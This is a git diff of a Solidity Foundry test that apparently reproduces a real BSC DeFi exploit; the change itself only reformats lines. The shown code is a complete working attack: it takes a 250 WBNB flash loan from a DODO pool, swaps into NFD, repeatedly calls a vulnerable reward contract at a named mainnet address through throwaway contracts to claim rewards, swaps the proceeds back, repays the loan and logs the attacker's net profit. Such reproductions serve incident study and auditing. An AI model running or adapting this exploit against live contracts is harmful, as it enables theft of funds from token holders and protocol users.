@@ -30,8 +30,8 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 address constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;
 
 contract Attacker is Test {
-    IPancakeRouter constant PancakeRouter =
-        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+
+    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
     address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
@@ -54,16 +54,8 @@ contract Attacker is Test {
         IDVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);
     }
 
-    function DVMFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
-        require(
-            IERC20(wbnb).balanceOf(address(this)) == quoteAmount,
-            "Invalid WBNB amount"
-        );
+    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, "Invalid WBNB amount");
         require(quoteAmount == 250 * 1e18, "Invalid WBNB amount");
 
         console.log("Swap 250 WBNB to NFD...");
@@ -73,18 +65,10 @@ contract Attacker is Test {
         path[2] = nfd;
         IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            quoteAmount,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            quoteAmount, 0, path, address(this), block.timestamp
         );
 
-        emit log_named_decimal_uint(
-            "[*] NFD balance before attack",
-            IERC20(nfd).balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[*] NFD balance before attack", IERC20(nfd).balanceOf(address(this)), 18);
 
         console.log("Abuse the Reward Contract...");
         for (uint8 i; i < 50; i++) {
@@ -94,11 +78,7 @@ contract Attacker is Test {
             exploit.abuse();
         }
 
-        emit log_named_decimal_uint(
-            "[*] NFD balance after attack",
-            IERC20(nfd).balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[*] NFD balance after attack", IERC20(nfd).balanceOf(address(this)), 18);
 
         console.log("Swap the profit...");
         uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));
@@ -107,37 +87,29 @@ contract Attacker is Test {
         path[2] = wbnb;
         IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            nfdBalance,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            nfdBalance, 0, path, address(this), block.timestamp
         );
 
         console.log("Repay the flashloan...");
         IERC20(wbnb).transfer(msg.sender, 250 * 1e18);
 
-        emit log_named_decimal_uint(
-            "Attacker's Net Profit",
-            IERC20(wbnb).balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Attacker's Net Profit", IERC20(wbnb).balanceOf(address(this)), 18);
     }
+
 }
 
 contract Exploit is Test {
+
     address constant rewardContract = vulnContract;
     address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
 
     // Function 0xe2f9d09c
     function abuse() external {
-        (bool success, ) = rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
+        (bool success,) = rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
         uint256 bal = IERC20(nfd).balanceOf(address(this));
-        require(
-            IERC20(nfd).transfer(msg.sender, bal),
-            "Transfer profit failed"
-        );
+        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed");
     }
+
 }
 
 /* -------------------- Decompiled Vulnerable Contract 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e -------------------- */
